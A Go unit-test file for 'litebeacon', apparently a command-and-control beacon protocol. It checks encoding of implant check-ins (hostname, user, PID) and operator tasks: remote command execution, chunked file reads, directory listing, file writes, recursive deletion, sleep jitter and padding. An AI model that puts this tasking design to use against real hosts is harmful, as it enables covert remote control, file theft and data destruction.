package litebeacon

import (
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
)

func TestEncodeDecodeTLVs(t *testing.T) {
	items := []tlv{
		{Type: 0x01, Value: []byte("abcdef0123456789")},
		{Type: 0x02, Value: []byte{1, 2, 3, 4, 5, 6, 7, 8}},
		{Type: 0x0f, Value: bytes.Repeat([]byte{0xAA}, 300)},
	}
	encoded := encodeTLVs(items)
	decoded, err := decodeTLVs(encoded)
	if err != nil {
		t.Fatal(err)
	}
	if len(decoded) != len(items) {
		t.Fatalf("decoded %d items, want %d", len(decoded), len(items))
	}
	for i := range items {
		if decoded[i].Type != items[i].Type || !bytes.Equal(decoded[i].Value, items[i].Value) {
			t.Fatalf("item %d mismatch: %#v", i, decoded[i])
		}
	}
}

func TestDecodeTLVsRejectsTruncation(t *testing.T) {
	if _, err := decodeTLVs([]byte{0x01, 0x05, 0x00, 'a'}); err == nil {
		t.Fatal("expected truncation error")
	}
	// declared 0xFF00 bytes but only 1 present — also truncation
	if _, err := decodeTLVs([]byte{0x01, 0x00, 0xFF, 'a'}); err == nil {
		t.Fatal("expected truncation error")
	}
}

func TestBuildTaskPayloadRejectsOversizeValue(t *testing.T) {
	long := strings.Repeat("a", 0xFFFF+1)
	if _, err := buildTaskPayload([]Task{{ID: 1, Type: TaskExec, Cmd: long, TimeoutSec: 1}}, 0); err == nil {
		t.Fatal("expected oversize rejection")
	}
}

func TestBuildCheckinResponse(t *testing.T) {
	tasks, err := buildTaskPayload([]Task{{ID: 9, Type: TaskExit}}, 0)
	if err != nil {
		t.Fatal(err)
	}
	resp := buildCheckinResponse(tasks, 10, true, 7)
	items, err := decodeTLVs(resp)
	if err != nil {
		t.Fatal(err)
	}
	var hint *tlv
	var pad *tlv
	for i := range items {
		switch items[i].Type {
		case tlvNextHint:
			hint = &items[i]
		case tlvPad:
			pad = &items[i]
		}
	}
	if hint == nil || len(hint.Value) != 5 || binary.LittleEndian.Uint32(hint.Value[:4]) != 10 || hint.Value[4] != 1 {
		t.Fatalf("missing/bad interval hint: %#v", hint)
	}
	if pad == nil || len(pad.Value) != 7 {
		t.Fatalf("missing/bad pad: %#v", pad)
	}
}

func TestParseCheckin(t *testing.T) {
	now := uint64(1770000000)
	plain := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(now)},
		{Type: tlvHostname, Value: []byte("web01")},
		{Type: tlvOS, Value: []byte("Linux 5.10")},
		{Type: tlvArch, Value: []byte("amd64")},
		{Type: tlvUsername, Value: []byte("root")},
		{Type: tlvPID, Value: u32b(4242)},
		{Type: tlvExecRes, Value: append(append(u32b(7), u32b(0)...), []byte("id output")...)},
		{Type: tlvFileRes, Value: fileResBytes(9, 0, 0, 10, []byte("file-bytes"))},
	})
	ci, err := parseCheckin(plain)
	if err != nil {
		t.Fatal(err)
	}
	if ci.BeaconID != "0123456789abcdef" || ci.TS != now {
		t.Fatalf("bad id/ts: %#v", ci)
	}
	if ci.Info == nil || ci.Info.Hostname != "web01" || ci.Info.Username != "root" || ci.Info.PID != 4242 {
		t.Fatalf("bad info: %#v", ci.Info)
	}
	if len(ci.Execs) != 1 || ci.Execs[0].TaskID != 7 || ci.Execs[0].Exit != 0 || string(ci.Execs[0].Output) != "id output" {
		t.Fatalf("bad exec result: %#v", ci.Execs)
	}
	if len(ci.Files) != 1 || ci.Files[0].TaskID != 9 || !ci.Files[0].Chunked ||
		ci.Files[0].Offset != 0 || ci.Files[0].Total != 10 || string(ci.Files[0].Content) != "file-bytes" {
		t.Fatalf("bad file result: %#v", ci.Files)
	}
}

func TestParseChunkedFileResult(t *testing.T) {
	ci, err := parseCheckin(encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1)},
		{Type: tlvFileRes, Value: fileResBytes(3, 0, 48000, 96000, []byte("chunk"))},
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(ci.Files) != 1 {
		t.Fatalf("files: %#v", ci.Files)
	}
	got := ci.Files[0]
	if !got.Chunked || got.TaskID != 3 || got.Offset != 48000 || got.Total != 96000 || string(got.Content) != "chunk" {
		t.Fatalf("chunk: %#v", got)
	}
}

func TestParseCheckinRequiresIDAndTS(t *testing.T) {
	if _, err := parseCheckin(encodeTLVs([]tlv{{Type: tlvBeaconID, Value: []byte("x")}})); err == nil {
		t.Fatal("expected missing timestamp error")
	}
	if _, err := parseCheckin(encodeTLVs([]tlv{{Type: tlvTimestamp, Value: u64b(1)}})); err == nil {
		t.Fatal("expected missing id error")
	}
}

func TestParseCheckinNoHello(t *testing.T) {
	plain := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1770000000)},
	})
	ci, err := parseCheckin(plain)
	if err != nil {
		t.Fatal(err)
	}
	if ci.Info != nil {
		t.Fatalf("info should be nil without hello fields: %#v", ci.Info)
	}
}

func TestBuildTaskPayload(t *testing.T) {
	tasks := []Task{
		{ID: 1, Type: TaskExec, Cmd: "id", TimeoutSec: 30},
		{ID: 2, Type: TaskRead, Path: "/etc/hostname"},
		{ID: 3, Type: TaskSleep, IntervalSec: 180, JitterPct: 10},
		{ID: 4, Type: TaskExit},
	}
	payload, err := buildTaskPayload(tasks, 5)
	if err != nil {
		t.Fatal(err)
	}
	items, err := decodeTLVs(payload)
	if err != nil {
		t.Fatal(err)
	}
	if len(items) != 5 {
		t.Fatalf("got %d items (incl. pad), want 5", len(items))
	}
	if items[0].Type != TaskExec || u32(items[0].Value[0:4]) != 1 ||
		binary.LittleEndian.Uint16(items[0].Value[4:6]) != 30 {
		t.Fatalf("bad exec task: %#v", items[0])
	}
	if string(items[0].Value[6:]) != "id" {
		t.Fatalf("bad exec cmd: %q", items[0].Value[6:])
	}
	if items[1].Type != TaskRead || u32(items[1].Value[0:4]) != 2 || u32(items[1].Value[4:8]) != 0 ||
		string(items[1].Value[8:]) != "/etc/hostname" {
		t.Fatalf("bad read task: %#v", items[1])
	}
	if items[2].Type != TaskSleep || u32(items[2].Value[0:4]) != 180 || items[2].Value[4] != 10 {
		t.Fatalf("bad sleep task: %#v", items[2])
	}
	if items[3].Type != TaskExit || len(items[3].Value) != 0 {
		t.Fatalf("bad exit task: %#v", items[3])
	}
	if items[4].Type != tlvPad || len(items[4].Value) != 5 {
		t.Fatalf("bad pad: %#v", items[4])
	}
}

func TestBuildTaskPayloadReadOffset(t *testing.T) {
	payload, err := buildTaskPayload([]Task{{ID: 9, Type: TaskRead, Path: "/tmp/a", Offset: uint32(fileChunkSize)}}, 0)
	if err != nil {
		t.Fatal(err)
	}
	items, err := decodeTLVs(payload)
	if err != nil {
		t.Fatal(err)
	}
	if len(items) != 1 || items[0].Type != TaskRead {
		t.Fatalf("items: %#v", items)
	}
	if u32(items[0].Value[0:4]) != 9 || u32(items[0].Value[4:8]) != uint32(fileChunkSize) || string(items[0].Value[8:]) != "/tmp/a" {
		t.Fatalf("read offset task: %#v", items[0])
	}
}

func TestFileChunkFitsTLV(t *testing.T) {
	if fileChunkSize+13 > 0xFFFF {
		t.Fatalf("file chunk %d plus header exceeds u16 tlv", fileChunkSize)
	}
}

func TestParseDirResult(t *testing.T) {
	entry := func(isdir byte, size, mtime uint64, name string) []byte {
		v := []byte{isdir}
		v = append(v, u64b(size)...)
		v = append(v, u64b(mtime)...)
		v = append(v, u32b(uint32(len(name)))[0:2]...)
		return append(v, name...)
	}
	value := append(u32b(7), 0)
	value = append(value, 0) // not truncated
	value = append(value, entry(1, 4096, 1700000000, "sub")...)
	value = append(value, entry(0, 12, 1700000001, "a.txt")...)
	ci, err := parseCheckin(encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1)},
		{Type: tlvDirRes, Value: value},
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(ci.Dirs) != 1 {
		t.Fatalf("dirs: %#v", ci.Dirs)
	}
	got := ci.Dirs[0]
	if got.TaskID != 7 || got.Err != 0 || got.Truncated || len(got.Entries) != 2 {
		t.Fatalf("dir: %#v", got)
	}
	if got.Entries[0].Name != "sub" || !got.Entries[0].IsDir || got.Entries[0].Size != 4096 || got.Entries[0].ModTime != 1700000000 {
		t.Fatalf("entry0: %#v", got.Entries[0])
	}
	if got.Entries[1].Name != "a.txt" || got.Entries[1].IsDir || got.Entries[1].Size != 12 {
		t.Fatalf("entry1: %#v", got.Entries[1])
	}
}

func TestParseDirResultErrorAndTruncatedTail(t *testing.T) {
	// 错误结果没有条目
	ci, err := parseCheckin(encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1)},
		{Type: tlvDirRes, Value: append(u32b(9), 2, 0)},
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(ci.Dirs) != 1 || ci.Dirs[0].Err != 2 || len(ci.Dirs[0].Entries) != 0 {
		t.Fatalf("err dir: %#v", ci.Dirs)
	}
	// 半截条目被丢掉，不错位
	ci, err = parseCheckin(encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1)},
		{Type: tlvDirRes, Value: append(u32b(9), 0, 0, 1, 'a', 'b')},
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(ci.Dirs) != 1 || len(ci.Dirs[0].Entries) != 0 {
		t.Fatalf("partial tail: %#v", ci.Dirs)
	}
}

func TestBuildTaskPayloadListDir(t *testing.T) {
	payload, err := buildTaskPayload([]Task{{ID: 5, Type: TaskListDir, Path: "/var/log"}}, 0)
	if err != nil {
		t.Fatal(err)
	}
	items, err := decodeTLVs(payload)
	if err != nil {
		t.Fatal(err)
	}
	if len(items) != 1 || items[0].Type != TaskListDir {
		t.Fatalf("items: %#v", items)
	}
	if u32(items[0].Value[0:4]) != 5 || string(items[0].Value[4:]) != "/var/log" {
		t.Fatalf("listdir task: %#v", items[0])
	}
}

func TestBuildTaskPayloadFsOps(t *testing.T) {
	chunk := bytes.Repeat([]byte{0xAA}, fileChunkSize)
	payload, err := buildTaskPayload([]Task{
		{ID: 1, Type: TaskWrite, Path: "/tmp/a b.txt", Offset: 48000, Total: 96000,
			ExpectSize: 123, ExpectMTime: 1700000000, Force: true, Data: chunk},
		{ID: 2, Type: TaskRm, Path: "/tmp/dir", Recursive: true},
		{ID: 3, Type: TaskMv, Path: "/tmp/old", Dst: "/tmp/new"},
		{ID: 4, Type: TaskMkdir, Path: "/tmp/d"},
	}, 0)
	if err != nil {
		t.Fatal(err)
	}
	items, err := decodeTLVs(payload)
	if err != nil {
		t.Fatal(err)
	}
	if len(items) != 4 {
		t.Fatalf("items: %d", len(items))
	}
	w := items[0].Value
	if w[32] != 1 || u32(w[0:4]) != 1 || u32(w[4:8]) != 48000 ||
		uint64(binary.LittleEndian.Uint64(w[8:16])) != 96000 ||
		uint64(binary.LittleEndian.Uint64(w[16:24])) != 123 ||
		uint64(binary.LittleEndian.Uint64(w[24:32])) != 1700000000 {
		t.Fatalf("write header: %#v", w[:33])
	}
	plen := int(binary.LittleEndian.Uint16(w[33:35]))
	if string(w[35:35+plen]) != "/tmp/a b.txt" || !bytes.Equal(w[35+plen:], chunk) {
		t.Fatal("write path/chunk")
	}
	if items[1].Value[4] != 1 || string(items[1].Value[5:]) != "/tmp/dir" {
		t.Fatalf("rm: %#v", items[1])
	}
	sl := int(binary.LittleEndian.Uint16(items[2].Value[4:6]))
	if string(items[2].Value[6:6+sl]) != "/tmp/old" || string(items[2].Value[6+sl:]) != "/tmp/new" {
		t.Fatalf("mv: %#v", items[2])
	}
	if string(items[3].Value[4:]) != "/tmp/d" {
		t.Fatalf("mkdir: %#v", items[3])
	}
}

func TestParseStatusResult(t *testing.T) {
	ci, err := parseCheckin(encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1)},
		{Type: tlvStatusRes, Value: append(u32b(11), 4, 0, 0)},
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(ci.Statuses) != 1 || ci.Statuses[0].TaskID != 11 || ci.Statuses[0].Err != 4 || ci.Statuses[0].Msg != "" {
		t.Fatalf("status: %#v", ci.Statuses)
	}
}

func fileResBytes(id uint32, err uint8, offset, total uint32, chunk []byte) []byte {
	v := append(u32b(id), err)
	v = append(v, u32b(offset)...)
	v = append(v, u32b(total)...)
	return append(v, chunk...)
}

func u64b(v uint64) []byte {
	b := make([]byte, 8)
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
	b[3] = byte(v >> 24)
	b[4] = byte(v >> 32)
	b[5] = byte(v >> 40)
	b[6] = byte(v >> 48)
	b[7] = byte(v >> 56)
	return b
}
func u32b(v uint32) []byte {
	b := make([]byte, 4)
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
	b[3] = byte(v >> 24)
	return b
}
func u32(b []byte) uint32 {
	return uint32(b[0]) | uint32(b[1])<<8 | uint32(b[2])<<16 | uint32(b[3])<<24
}
